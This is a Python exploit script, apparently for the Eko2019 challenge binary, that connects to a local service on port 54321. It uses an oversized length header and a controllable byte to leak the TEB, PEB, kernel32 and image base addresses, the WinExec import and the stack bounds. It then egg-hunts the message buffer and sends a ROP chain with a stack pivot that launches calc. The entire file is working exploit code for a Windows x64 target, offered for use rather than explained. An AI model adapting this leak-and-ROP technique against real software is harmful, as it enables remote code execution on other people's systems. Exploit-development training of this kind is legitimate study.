import socket
import struct
import time


def p64(x):
    """
        Little-endian with 64 bit
    """
    return struct.pack("<Q", x)
def u64(x):
    """
        Unpack
    """
    return struct.unpack("<Q", x)[0]

def w8(x=.01):
    """
        delay for multistage exploit
    """
    time.sleep(x)
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 54321))
    return s

def craft_header():
    """
        Header_size = 16 byte
            header = 8 bytes
            msg_len = 8 bytes
                3 LSB == 000
                by
                    msg_len << 3
                    msg_len -= msg_len&0x7
                    ==> msg_len must%8 = 0
        return header
    """
    header_size = 0x10
    header = b'Eko2019'
    header += b'\x00'
    #msg size should <= 0x200 = 512 bytes
    # msg_len = p64(512)
    msg_len = p64(0xFFFFFC00) # <-- try -1
    # print(msg_len)
    

    header += msg_len
    header += b'\x00'*(header_size-len(header))
    return header


def exploit():

    # leak peb
    # print("[*] Sending Header...")
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x65"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(0x30) #replace rcx <-- TEB offset

    s.send(msg)
    teb = u64(s.recv(2048))
    
    print("[+] Leaked TEB:", str(hex(teb)))

    s.close() # close connection
    w8()
    

    # Leak PEB
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(teb+0x60) #replace rcx <-- PEB offset

    s.send(msg)
    peb = u64(s.recv(2048))
    
    print("[+] Leaked PEB:", str(hex(peb)))

    s.close() # close connection
    w8()

    # Leak ldr from PEB
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(peb+0x18) #replace rcx <-- ldr offset

    s.send(msg)
    ldr = u64(s.recv(2048))
    
    print("[+] Leaked LDR:", str(hex(ldr)))

    s.close() # close connection
    w8()

    #Leak InMemoryOrderModuleList
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(ldr+0x20) #replace rcx <-- InMemoryOrderModuleList offset

    s.send(msg)
    inMemOrder = u64(s.recv(2048))
    
    print("[+] Leaked InMemoryOrderModuleList :", str(hex(inMemOrder)))

    s.close() # close connection
    w8()

    # Leak Kernel32 Address 

    # Traverse 1
    
    s = connect()
    s.send(craft_header())
    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(inMemOrder) #replace rcx <-- InMemoryOrderModuleList offset
    s.send(msg)
    travere1 = u64(s.recv(2048))
    # print("Traverse1 : ", str(hex(travere1)))
    s.close() # close connection
    w8()
    # Traverse 2 
    s = connect()
    s.send(craft_header())
    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(travere1) #replace rcx <-- InMemoryOrderModuleList offset
    s.send(msg)
    travere2 = u64(s.recv(2048))
    # print("Traverse2 :",b str(hex(travere1)))

    s.close() # close connection
    w8()
    #Kernel32 Leak
    s = connect()
    s.send(craft_header())
    msg = b"A"*(512)
    msg += b"\x66"
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(travere2+0x20) #replace rcx <-- InMemoryOrderModuleList offset
    s.send(msg)
    kernel32 = u64(s.recv(2048))

    print("[+] Leaked Kernel32 Address:", str(hex(kernel32)))
    s.close() # close connection
    w8()

    # Leak ImageBaseAddress <- We have Address winexec in IAT so we don't need to leak Kernel32.dll address
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"  # mov rax, ptr qword [rcx]
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(peb+0x10) #replace rcx <-- ImageBaseAddress

    s.send(msg)
    ImageBaseAddress = u64(s.recv(2048))
    
    
    print("[+] Leaked ImageBaseAddress:", str(hex(ImageBaseAddress)))

    s.close() # close connection
    w8()

    #Leaked WinExec Address 
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"  # mov rax, ptr qword [rcx]
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(ImageBaseAddress+0x9010) #replace rcx <-- ImageBaseAddress + WinExec Offset

    s.send(msg)
    winExec = u64(s.recv(2048))
    print("[+] Leaked WinExec Address :", str(hex(winExec)))
    s.close() # close connection
    w8()

    # Leak StackBase
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"  # mov rax, ptr qword [rcx]
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(teb+0x8) #replace rcx <-- ImageBaseAddress + WinExec Offset

    s.send(msg)
    stackBase = u64(s.recv(2048))
    print("[+] Leaked StackBase Address :", str(hex(stackBase)))
    s.close() # close connection
    w8()

    #Leak StackLimit Address
    s = connect()
    s.send(craft_header())

    msg = b"A"*(512)
    msg += b"\x66"  # mov rax, ptr qword [rcx]
    msg += b"\x00"*7 #padding for reverse_arr
    msg += p64(teb+0x10) #replace rcx <-- ImageBaseAddress + WinExec Offset

    s.send(msg)
    stackLimit = u64(s.recv(2048))
    print("[+] Leaked StackLimit Address :", str(hex(stackLimit)))
    s.close() # close connection
    w8()

    # Stack Msg_buf Location
    # Own egg should between StackLimit and StackBase
    # Do an egghunter-like
    msg_buf_addr = p64(0x15f540)
    print("[!] Leaking msg_buf by egghunting...")
    for addr in range(stackBase-8, stackLimit, -8):
        s = connect()
        s.send(craft_header())

        egg = b"\x41\42\x43\x44\x45\x46\x47\x48"
        msg = egg # Egg 
        msg += b"A"*(512-8)
        msg += b"\x66"  # mov rax, ptr qword [rcx]
        msg += b"\x00"*7 #padding for reverse_arr
        msg += p64(addr) #replace rcx <-- ImageBaseAddress + WinExec Offset

        s.send(msg)
        res = u64(s.recv(2048))
        # print("Addr:", p64(res))
        if res == u64(egg):
            print("[+] Leaked msg_buf Address :", str(hex(addr)))
            msg_buf_addr = p64(addr)
            break
        s.close() # close connection
        w8()

    # Stack Pivot 
    # From       msg_buf             Control byte Adr
    #            (0x00AFFAF8+8)  -  0x00AFFA98
    # We need to pivot +0x68 Bytes from eko2019+1000 function that we can arbitary write
    # Gadget:
    # 0x14000158c: add esp, 0x78 ; ret  ;  (1 found)

    print("[+] Stack Pivoting... ")

    # ROP to pop Calc
    # Â Â Â Â UINT WINAPI WinExec(Â Â Â Â Â Â Â Â Â Â Â        *RSP    => address of WinExec
    #Â Â         __inÂ  LPCSTR lpCmdLine,Â Â Â Â Â Â     RCX     => calc.exe
    #Â         Â __inÂ  UINT uCmdShowÂ Â Â Â Â Â Â Â Â Â     RDX     => 0x1
    #    );
    # 0x180027803: pop rcx ; ret  ;  (1 found) kernel32.dll
    # 0x140008c41: xor rax, rax ; ret  ;  (1 found) eko2019.exe
    # 0x18001c450: pop rdx ; add dword [r8], eax ; add rsp, 0x38 ; ret  ;  (1 found) kernel32
    #   R8 already store accessable location 
    # 0x140001fd7: pop rsp ; ret  ;  (1 found) eko2019.exe
    # 0x140001164: add rsp, 0x58 ; ret  ;  (1 found) eko2019.exe
    # 0x14000160c: add rsp, 0x28 ; ret  ;  (1 found) eko2019.exe
    # 0x140008789: add rsp, 0x10 ; ret  ;  (1 found) eko2019.exe
    # 0x140002e71: add rsp, 0x38 ; ret  ;  (1 found)



    #Repair RSP
    # Todo: Find Location of Saved Rip of incoming_handler function
    # Todo2: Calculate offset Save RIP with msg_buf
    # Todo3: Restore RSP with rop gadget

    #Debug Shellcode bp here 
    # bp KERNEL32!WinExec+0x1a7

    pop_rcx = p64(kernel32+0x27803)
    xor_rax_rax = p64(ImageBaseAddress+0x8c41)
    pop_rdx = p64(kernel32+0x1c450)
    calc_addr = p64(u64(msg_buf_addr)+0x38)
    pop_rsp = p64(ImageBaseAddress+0x1fd7)
    add_esp_0x78 = p64(ImageBaseAddress+0x158c)
    add_esp_0x58 = p64(ImageBaseAddress+0x1164)
    add_esp_0x28 = p64(ImageBaseAddress+0x160c)
    add_esp_0x10 = p64(ImageBaseAddress+0x8789)
    add_esp_0x38 = p64(ImageBaseAddress+0x2e71)


    s = connect()
    s.send(craft_header())


    msg = b"\x00\x00\x00\x00\x00\x00\x00\x00" # pop the calc
    msg += b"\x00"*8

    # # R O P ðŸ¤ŸðŸ˜ŽðŸ¤Ÿ 
    msg += pop_rcx
    msg += calc_addr
    msg += xor_rax_rax
    msg += pop_rdx
    msg += p64(1)
    # msg += b"B"*(0x8)
    msg += b"\x63\x61\x6c\x63\x00\x00\x00\x00"
    msg += b"A"*(0x38-0x8) # Alignment for add rsp, 0x38
    msg += p64(winExec) 
    msg += add_esp_0x78 # 0x1c0-0x78 = 0x148
    msg += b"A"*0x78
    msg += add_esp_0x78 # 0x1c0-0x78-0x78 = 0xd0
    msg += b"A"*0x78
    msg += add_esp_0x78 # 0x1c0-0x78-0x78-0x78 = 0x58
    msg += b"A"*0x78
    msg += add_esp_0x38 


    msg += b"A"*(512-len(msg))
    msg += b"\x51" #push rcx
    msg += b"\x00"*7 #padding for reverse_arr
    msg += add_esp_0x78 #gadget to pivot stack

    print("[!] Sending Payload...")
    s.send(msg)
    res = s.recv(2048)
    print("[!] Pop the calc!")

    s.close() # close connection
    w8()

exploit()
